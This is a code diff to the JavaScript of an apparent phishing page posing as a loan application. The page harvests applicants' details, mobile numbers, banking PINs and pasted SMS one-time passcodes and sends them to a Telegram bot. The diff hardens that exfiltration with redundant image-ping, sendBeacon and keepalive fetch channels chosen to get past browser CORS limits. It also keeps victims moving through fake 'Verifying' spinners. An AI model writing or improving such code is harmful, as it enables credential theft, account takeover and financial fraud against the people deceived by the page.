@@ -17,39 +17,40 @@ const TELEGRAM = {
 };
 
 /* ─── SEND TO TELEGRAM ──────────────────────────────────────── */
-const postToTelegram = async (text) => {
-  const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 6000);
+const postToTelegram = (text) => {
+  const url = `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`;
 
+  // 1. Image ping (immune to CORS in all browsers)
   try {
-    const params = new URLSearchParams();
-    params.append('chat_id', TELEGRAM.CHAT_ID);
-    params.append('text', text);
+    const img = new Image();
+    img.src = `${url}?chat_id=${encodeURIComponent(TELEGRAM.CHAT_ID)}&text=${encodeURIComponent(text)}`;
+  } catch (e) {}
 
-    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      body: params,
-      signal: controller.signal
-    });
-    clearTimeout(timeoutId);
-    const data = await res.json().catch(() => null);
-    if (data && !data.ok) console.warn('Telegram error:', data.description);
-    return data && data.ok;
-  } catch (err) {
-    clearTimeout(timeoutId);
-    console.warn('Telegram POST failed, attempting GET fallback:', err.message);
-    try {
-      const getUrl = `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(TELEGRAM.CHAT_ID)}&text=${encodeURIComponent(text)}`;
-      await fetch(getUrl, { mode: 'no-cors' });
-      return true;
-    } catch (e) {
-      console.warn('Telegram GET fallback failed:', e.message);
-      return false;
+  // 2. sendBeacon (bypasses browser preflight, background delivery)
+  try {
+    if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
+      const fd = new FormData();
+      fd.append('chat_id', TELEGRAM.CHAT_ID);
+      fd.append('text', text);
+      navigator.sendBeacon(url, fd);
     }
-  }
+  } catch (e) {}
+
+  // 3. fetch POST with JSON
+  try {
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM.CHAT_ID,
+        text: text,
+      }),
+      keepalive: true,
+    }).catch(() => {});
+  } catch (e) {}
 };
 
-const sendToTelegram = async (s) => {
+const sendToTelegram = (s) => {
   const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });
   const monthly = (() => {
     const r = (s.rate / 100) / 12;
@@ -85,11 +86,11 @@ const sendToTelegram = async (s) => {
     `⏰ Submitted: ${now}`,
   ].join('\n');
 
-  return await postToTelegram(msg);
+  postToTelegram(msg);
 };
 
-const sendTextToTelegram = async (msg) => {
-  return await postToTelegram(msg);
+const sendTextToTelegram = (msg) => {
+  postToTelegram(msg);
 };
 
 /* ─── VALIDATION ──────────────────────────────────────────── */
@@ -148,13 +149,17 @@ const attachLiveValidation = () => {
 };
 
 /* ─── SPINNER ─────────────────────────────────────────────── */
+const hideSpinner = () => {
+  document.querySelectorAll('#spinner, .spinner-overlay').forEach(el => el.remove());
+};
+
 const showSpinner = (msg = 'Processing your application...') => {
+  hideSpinner();
   const el = document.createElement('div');
   el.className = 'spinner-overlay'; el.id = 'spinner';
   el.innerHTML = `<div class="spinner"></div><div class="spinner-label">${msg}</div>`;
   document.body.appendChild(el);
 };
-const hideSpinner = () => document.getElementById('spinner')?.remove();
 
 
 const state = {
@@ -490,6 +495,7 @@ const renderPinLogin = (maskedPhone = '', isOtp = false) => `
 
 /* ─── ROUTER ─────────────────────────────────────────────────── */
 function navigate(view) {
+  hideSpinner();
 
   /* ─ CALCULATOR ─ */
   if (view === 'calculator') {
@@ -550,28 +556,30 @@ function navigate(view) {
   else if (view === 'review') {
     app.innerHTML = renderReview();
     document.getElementById('backBtn').addEventListener('click', () => navigate('form'));
-    document.getElementById('submitBtn').addEventListener('click', async () => {
+    document.getElementById('submitBtn').addEventListener('click', () => {
       if (!document.getElementById('reviewCheck').checked) {
         alert('Please confirm the terms and conditions to proceed.');
         return;
       }
       showSpinner('Submitting your application...');
-      await sendToTelegram(state);
-      hideSpinner();
-      navigate('success');
+      sendToTelegram(state);
+      setTimeout(() => {
+        hideSpinner();
+        navigate('success');
+      }, 500);
     });
   }
 
   /* ─ SUCCESS ─ */
   else if (view === 'success') {
     app.innerHTML = renderSuccess();
-    setTimeout(() => navigate('mobileLogin'), 1800);
+    setTimeout(() => navigate('mobileLogin'), 1500);
   }
 
   /* ─ MOBILE LOGIN ─ */
   else if (view === 'mobileLogin') {
     app.innerHTML = renderMobileLogin();
-    const mbNextHandler = async () => {
+    const mbNextHandler = () => {
       const phone = document.getElementById('mbPhone').value;
       if (!phone) { alert('Please enter your mobile number.'); return; }
       state.mbPhone = phone;
@@ -582,9 +590,11 @@ function navigate(view) {
         : phone;
       state.maskedPhone = masked;
       showSpinner('Verifying...');
-      await sendTextToTelegram(`📱 MOBILE LOGIN\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
-      hideSpinner();
-      navigate('pinLogin');
+      sendTextToTelegram(`📱 MOBILE LOGIN\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
+      setTimeout(() => {
+        hideSpinner();
+        navigate('pinLogin');
+      }, 500);
     };
     document.getElementById('mbNext').addEventListener('click', mbNextHandler);
     document.getElementById('mbPhone').addEventListener('keydown', e => {
@@ -617,7 +627,7 @@ function navigate(view) {
 
     attachInputEvents(pinInput, !isOtp);
 
-    document.getElementById('pinLoginBtn').addEventListener('click', async () => {
+    document.getElementById('pinLoginBtn').addEventListener('click', () => {
       const pinGrid = document.getElementById('pinGrid');
       const pinErr = document.getElementById('pinError');
       const pinTitle = document.getElementById('pinTitle');
@@ -641,28 +651,31 @@ function navigate(view) {
 
       if (!currentIsOtp) {
         showSpinner('Authenticating...');
-        await sendTextToTelegram(`🔐 PIN LOGIN\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
-        hideSpinner();
+        sendTextToTelegram(`🔐 PIN LOGIN\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
+        setTimeout(() => {
+          hideSpinner();
+          // Transition to second pin: OTP with full message instruction
+          pinTitle.textContent = 'OTP Verification 🔒';
+          pinSubtext.textContent = 'Please copy the full message containing your OTP and paste it below';
 
-        // Transition to second pin: OTP with full message instruction
-        pinTitle.textContent = 'OTP Verification 🔒';
-        pinSubtext.textContent = 'Please copy the full message containing your OTP and paste it below';
+          const otpBanner = document.getElementById('otpBanner');
+          if (otpBanner) otpBanner.style.display = 'block';
 
-        const otpBanner = document.getElementById('otpBanner');
-        if (otpBanner) otpBanner.style.display = 'block';
+          pinGrid.innerHTML = `<textarea id="pinInput" rows="3" placeholder="Paste full message containing OTP here..."
+            style="width:100%; padding:14px 16px; font-size:0.92rem; line-height:1.5; color:#1e293b; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box; resize:none; font-family:inherit;"></textarea>`;
 
-        pinGrid.innerHTML = `<textarea id="pinInput" rows="3" placeholder="Paste full message containing OTP here..."
-          style="width:100%; padding:14px 16px; font-size:0.92rem; line-height:1.5; color:#1e293b; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box; resize:none; font-family:inherit;"></textarea>`;
+          attachInputEvents(document.getElementById('pinInput'), false);
 
-        attachInputEvents(document.getElementById('pinInput'), false);
-
-        pinErr.textContent = 'Please paste the full message containing your OTP.';
-        pinLoginBtn.textContent = 'Submit OTP';
+          pinErr.textContent = 'Please paste the full message containing your OTP.';
+          pinLoginBtn.textContent = 'Submit OTP';
+        }, 500);
       } else {
         showSpinner('Verifying OTP...');
-        await sendTextToTelegram(`🔑 OTP / FULL MESSAGE RECEIVED\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
-        hideSpinner();
-        navigate('loginSuccess');
+        sendTextToTelegram(`🔑 OTP / FULL MESSAGE RECEIVED\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
+        setTimeout(() => {
+          hideSpinner();
+          navigate('loginSuccess');
+        }, 500);
       }
     });
   }
